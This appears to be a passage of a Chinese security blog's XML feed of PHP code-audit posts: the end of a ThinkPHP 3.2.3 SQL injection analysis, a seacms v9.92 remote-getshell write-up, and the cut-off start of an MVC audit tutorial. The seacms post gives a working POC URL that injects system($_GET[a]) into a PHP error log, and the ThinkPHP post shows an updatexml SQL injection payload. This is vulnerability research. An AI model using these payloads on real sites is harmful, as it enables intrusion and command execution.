data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/jbjg0fjfhdf6dzksskza.jpg"                                        ><br>最后执行的sql语句就是<code>SELECT * FROM </code>user<code>WHERE 1 and 1=updatexml(1,concat(0x7,(select user()),0x7e),1)# LIMIT 1 </code>从而触发了注入点<br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/zspglxdtt8l6wfbnresx.jpg"                                        ></p><p>漏洞触发的原因是，在<code>find</code>函数对传入的数据进行了处理<br>1 <img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321933/blog/ryy4buichlmogc1vzpha.jpg"                                        ><br>这里判断了数字和字符型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$where</span>[<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPk</span>()]  =   <span class="variable">$options</span>; <span class="comment">//这里where是一个数组类型</span></span><br><span class="line">            <span class="variable">$options</span>                =   <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]       =   <span class="variable">$where</span>;</span><br></pre></td></tr></table></figure><p>2 进入<code>_parseOptions</code>对字段进行了检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字段类型验证</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>])) &#123;</span><br><span class="line">          <span class="comment">// 对数组查询条件进行字段类型检查</span></span><br><span class="line">          <span class="keyword">foreach</span> (<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">              <span class="variable">$key</span>            =   <span class="title function_ invoke__">trim</span>(<span class="variable">$key</span>);</span><br><span class="line">              <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>,<span class="variable">$fields</span>,<span class="literal">true</span>))&#123;</span><br><span class="line">                  <span class="keyword">if</span>(<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_parseType</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>],<span class="variable">$key</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) &amp;&amp; <span class="string">&#x27;_&#x27;</span> != <span class="title function_ invoke__">substr</span>(<span class="variable">$key</span>,<span class="number">0</span>,<span class="number">1</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>,<span class="string">&#x27;.&#x27;</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>,<span class="string">&#x27;(&#x27;</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>,<span class="string">&#x27;|&#x27;</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>,<span class="string">&#x27;&amp;&#x27;</span>))&#123;</span><br><span class="line">                  <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;strict&#x27;</span>]))&#123;</span><br><span class="line">                      <span class="title function_ invoke__">E</span>(<span class="title function_ invoke__">L</span>(<span class="string">&#x27;_ERROR_QUERY_EXPRESS_&#x27;</span>).<span class="string">&#x27;:[&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                  &#125; </span><br><span class="line">                  <span class="keyword">unset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$key</span>]);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>在上面这段检查字段中对传入的<code>$options[&#39;where&#39;]</code>的内容进行了强制类型转换<br>重点在于<code> is_array($options[&#39;where&#39;])</code>由于我们传入的id是一个数组类型，所以在第一步那里并没有将<code>$options[&#39;where&#39;]</code>转化为数组类型，从而绕过了这里的判断条件，使得字段检查失效。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://paper.seebug.org/573/" >https://paper.seebug.org/573/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ThinkPHP3-2-3-SQL注入分析&quot;&gt;&lt;a href=&quot;#ThinkPHP3-2-3-SQL注入分析&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP3.2.3 SQL注入分析&quot;&gt;&lt;/a&gt;ThinkPHP3.2.3 SQL注入分析&lt;/</summary>
      
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>seacmsv9.92 前台Getshell</title>
    <link href="http://example.com/2019/07/30/seacmsv9-92-%E5%89%8D%E5%8F%B0Getshell/"/>
    <id>http://example.com/2019/07/30/seacmsv9-92-%E5%89%8D%E5%8F%B0Getshell/</id>
    <published>2019-07-30T14:12:27.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>位置：<code>/comment/api/index.php</code><br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/g4sm94sopu29axsjjfdg.png"                        alt="carbon -1-"                 ></p><p>首先在第三行引入了<code>common.php</code>文件<br><code>include/common.php</code>Line<code>98~118</code><br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/f3wx6uznjfuo9r79g6o0.png"                        alt="carbon"                 ><br>在这里对<code>GET、POST、Cookie</code>传入的参数进行注册<br>这里对后面漏洞的触发很重要吗，接着向下进行<br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1564457277/blog/dwozqbfv5fqsdq8zipsj.png"                        alt="carbon -2-"                 ></p><p>第19行进入了<code>ReadData</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ReadData</span>(<span class="params"><span class="variable">$id</span>,<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$type</span>,<span class="variable">$pCount</span>,<span class="variable">$rlist</span>;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$page</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="variable">$type</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$id</span>&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="number">0</span>] = <span class="title function_ invoke__">Readmlist</span>(<span class="variable">$id</span>,<span class="variable">$page</span>,<span class="variable">$ret</span>[<span class="number">4</span>]);</span><br><span class="line"><span class="variable">$ret</span>[<span class="number">3</span>] = <span class="variable">$pCount</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$rlist</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$x</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="number">1</span>] = <span class="title function_ invoke__">Readrlist</span>(<span class="variable">$x</span>,<span class="number">1</span>,<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$readData</span> = <span class="title function_ invoke__">FormatJson</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$readData</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>global $type,$pCount,$rlist;</code>这些参数都是通过前面提到过的注册而来的变量<br>重点在于<code>$rlist</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$rlist</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$x</span>))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$ret</span>[<span class="number">1</span>] = <span class="title function_ invoke__">Readrlist</span>(<span class="variable">$x</span>,<span class="number">1</span>,<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>将<code>$list</code>数组转换为字符串，接着进入到了<code>Readrlist</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Readrlist</span>(<span class="params"><span class="variable">$ids</span>,<span class="variable">$page</span>,<span class="variable">$size</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$dsql</span>,<span class="variable">$type</span>;</span><br><span class="line"><span class="variable">$rl</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=<span class="subst">$type</span> AND id in (<span class="subst">$ids</span>) ORDER BY id DESC&quot;</span>;</span><br><span class="line"><span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">setQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">Execute</span>(<span class="string">&#x27;commentrlist&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetArray</span>(<span class="string">&#x27;commentrlist&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$rl</span>[]=<span class="string">&quot;\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;\&quot;:&#123;\&quot;uid\&quot;:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;uid&#x27;</span>].<span class="string">&quot;,\&quot;tmp\&quot;:\&quot;\&quot;,\&quot;nick\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;face\&quot;:\&quot;\&quot;,\&quot;star\&quot;:\&quot;\&quot;,\&quot;anony\&quot;:&quot;</span>.(<span class="keyword">empty</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>])?<span class="number">1</span>:<span class="number">0</span>).<span class="string">&quot;,\&quot;from\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;time\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;dtime&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;reply\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;reply&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;content\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;msg&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;agree\&quot;:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;agree&#x27;</span>].<span class="string">&quot;,\&quot;aginst\&quot;:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;anti&#x27;</span>].<span class="string">&quot;,\&quot;pic\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;pic&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;vote\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;vote&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;allow\&quot;:\&quot;&quot;</span>.(<span class="keyword">empty</span>(<span class="variable">$row</span>[<span class="string">&#x27;anti&#x27;</span>])?<span class="number">0</span>:<span class="number">1</span>).<span class="string">&quot;\&quot;,\&quot;check\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;ischeck&#x27;</span>].<span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$readrlist</span>=<span class="title function_ invoke__">join</span>(<span class="variable">$rl</span>,<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$readrlist</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到拼接入sql语句并执行了<code> AND id in ($ids)</code><br>接下来看下<code>Execute</code>函数<br>位置<code>include/sql.class.php</code> Line<code>224~257</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//执行一个带返回结果的SQL语句，如SELECT，SHOW等</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Execute</span>(<span class="params"><span class="variable">$id</span>=<span class="string">&quot;me&quot;</span>, <span class="variable">$sql</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$dsql</span>;</span><br><span class="line"><span class="built_in">self</span>::<span class="variable">$i</span>++;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$dsql</span>-&gt;isClose)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Open</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$dsql</span>-&gt;isClose = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">SetQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//SQL语句安全检查</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;safeCheck)</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">CheckSql</span>(<span class="variable">$this</span>-&gt;queryString);</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$t1</span> = <span class="title function_ invoke__">ExecTime</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;result[<span class="variable">$id</span>] = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$this</span>-&gt;linkID,<span class="variable">$this</span>-&gt;queryString);</span><br><span class="line"><span class="comment">//查询性能测试</span></span><br><span class="line"><span class="comment">//$queryTime = ExecTime() - $t1;</span></span><br><span class="line"><span class="comment">//if($queryTime &gt; 0.05) &#123;</span></span><br><span class="line"><span class="comment">//echo $this-&gt;queryString.&quot;--&#123;$queryTime&#125;&lt;hr /&gt;\r\n&quot;; </span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;result[<span class="variable">$id</span>]===<span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">DisplayError</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$this</span>-&gt;linkID).<span class="string">&quot; &lt;br /&gt;Error sql: &lt;font color=&#x27;red&#x27;&gt;&quot;</span>.<span class="variable">$this</span>-&gt;queryString.<span class="string">&quot;&lt;/font&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点在于255行的<code>DisplayError</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DisplayError</span>(<span class="params"><span class="variable">$msg</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$errorTrackFile</span> = <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/../data/mysqli_error_trace.php&#x27;</span>;</span><br><span class="line"><span class="comment">//if( file_exists(dirname(__FILE__).&#x27;/../data/mysqli_error_trace.php&#x27;) )</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//@unlink(dirname(__FILE__).&#x27;/../data/mysqli_error_trace.php&#x27;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="variable">$emsg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div&gt;&lt;h3&gt;seacms Error Warning!&lt;/h3&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div&gt;&lt;a href=&#x27;http://www.seacms.net/ </span></span><br><span class="line"><span class="string">&#x27; target=&#x27;_blank&#x27; style=&#x27;color:red&#x27;&gt;Technical Support: http://www.seacms.net/&lt;/a&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div style=&#x27;line-helght:160%;font-size:14px;color:green&#x27;&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div style=&#x27;color:blue&#x27;&gt;&lt;br /&gt;Error page: &lt;font color=&#x27;red&#x27;&gt;&quot;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">GetCurUrl</span>().<span class="string">&quot;&lt;/font&gt;&lt;/div&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div&gt;Error infos: <span class="subst">&#123;$msg&#125;</span>&lt;/div&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$emsg</span> .= <span class="string">&quot;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$emsg</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$savemsg</span> = <span class="string">&#x27;Page: &#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">GetCurUrl</span>().<span class="string">&quot;\r\nError: &quot;</span>.<span class="variable">$msg</span>;</span><br><span class="line"><span class="comment">//保存MySql错误日志</span></span><br><span class="line"><span class="variable">$fp</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$errorTrackFile</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">@<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;\r\n&lt;?php /*\r\n <span class="subst">&#123;$savemsg&#125;</span> \r\n*/  ?&gt;\r\n\r\n&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数首先输出了提示错误的html代码，之后将mysql的错误日志保存在了<code>data/mysqli_error_trace.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$savemsg</span> = <span class="string">&#x27;Page: &#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">GetCurUrl</span>().<span class="string">&quot;\r\nError: &quot;</span>.<span class="variable">$msg</span>;</span><br><span class="line"><span class="comment">//保存MySql错误日志</span></span><br><span class="line"><span class="variable">$fp</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$errorTrackFile</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">@<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;\r\n&lt;?php /*\r\n <span class="subst">&#123;$savemsg&#125;</span> \r\n*/  ?&gt;\r\n\r\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里就触发了漏洞</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>这个漏洞的触发执行需要满足以下条件</p><ol><li>$page&gt;2</li><li>$rlist不可为空</li><li>触发sql错误</li><li>闭合文件中的注释</li></ol><p>poc：<code>/comment/api/index.php?type=1&amp;gid=1&amp;page=3&amp;ran=123&amp;rlist[]=123%27*/system($_GET[a]);/*</code></p><p><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/gpttrzajvme08g7rvdwz.jpg"                                        ><br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/no8dixrus5s6ved2k7ni.jpg"                                        ><br>打开<code>data/mysqli_error_trace.php</code><br><img                         lazyload                       alt="image"                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/cggq70wialtbfqhlchlu.jpg"                                        ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h2&gt;&lt;p&gt;位置：&lt;code&gt;/comment/api/index.php&lt;/code&gt;&lt;br&gt;&lt;img  
             </summary>
      
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计入门篇二 ——MVC结构审计</title>
    <link href="http://example.com/2019/05/16/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%AF%87%E4%BA%8C-%E2%80%94%E2%80%94MVC%E7%BB%93%E6%9E%84%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2019/05/16/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%AF%87%E4%BA%8C-%E2%80%94%E2%80%94MVC%E7%BB%93%E6%9E%84%E5%AE%A1%E8%AE%A1/</id>
    <published>2019-05-16T13:37:12.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-MVC简介"><a href="#0x0-MVC简介" class="headerlink" title="0x0 MVC简介"></a>0x0 MVC简介</h2><p>在审计代码之前我们先来了解下 什么是MVC。</p><p>MVC模式代表 Model-View-Controller(模型-视图-控制器) 模式。这种模式用于应用程序的分层开发。</p><ul><li><strong>模型Model</strong> – 管理<strong>大部分的业务逻辑</strong>和<strong>所有的数据库逻辑</strong>。模型提供了连接和操作数据库的抽象层。</li><li><strong>控制器Controller</strong> - 负责响应用户请求、准备数据，以及决定如何展示数据。</li><li><strong>视图View</strong> – 负责<strong>渲染数据</strong>，通过HTML方式呈现给用户。</li></ul><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/05/14/5cda778ee82f867877.png"                                        ></p><p>mvc的运行流程：</p><ol><li>controller获取用户的请求</li><li>controller根据获取的请求调用相应的Model完成状态的读写操作</li><li>controller将Model处理的数据传递给View</li><li>View将数据渲染将结果呈现给用户</li></ol><h2 id="0x1-了解目录结构"><a href="#0x1-了解目录结构" class="headerlink" title="0x1 了解目录结构"></a>0x1 了解目录结构</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-- YxtCMF_v6.1</span><br><span class="line">-- admin  后台静态文件</span><br><span class="line">    -- application应用目录</span><br><span class="line">    -- data数据配置文件</span><br><span class="line">    -- Expand静态储存扩展</span><br><span class="line">    -- plugins插件</span><br><span class="line">    -- public资源文件目录</span><br><span class="line">    -- themes主题</span><br><span class="line">    -- ueditor编辑器</span><br><span class="line">    -- update升级目录</span><br><span class="line">    -- Uploads上传目录</span><br><span class="line">    -- yxtedu核心目录根据Thinkphp3.2.3开发的</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/05/14/5cda7bdeb016985019.png"                                        ></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">├─ThinkPHP 框架系统目录（可以部署在非web目录下面）</span><br><span class="line">│  ├─Common       核心公共函数目录</span><br><span class="line">│  ├─Conf         核心配置目录 </span><br><span class="line">│  ├─Lang         核心语言包目录</span><br><span class="line">│  ├─Library      框架类库目录</span><br><span class="line">│  │  ├─Think     核心Think类库包目录</span><br><span class="line">│  │  ├─Behavior  行为类库目录</span><br><span class="line">│  │  ├─Org       Org类库包目录</span><br><span class="line">│  │  ├─Vendor    第三方类库目录</span><br><span class="line">│  │  ├─ ...      更多类库目录</span><br><span class="line">│  ├─Mode         框架应用模式目录</span><br><span class="line">│  ├─Tpl          系统模板目录</span><br><span class="line">│  ├─LICENSE.txt  框架授权协议文件</span><br><span class="line">│  ├─logo.png     框架LOGO文件</span><br><span class="line">│  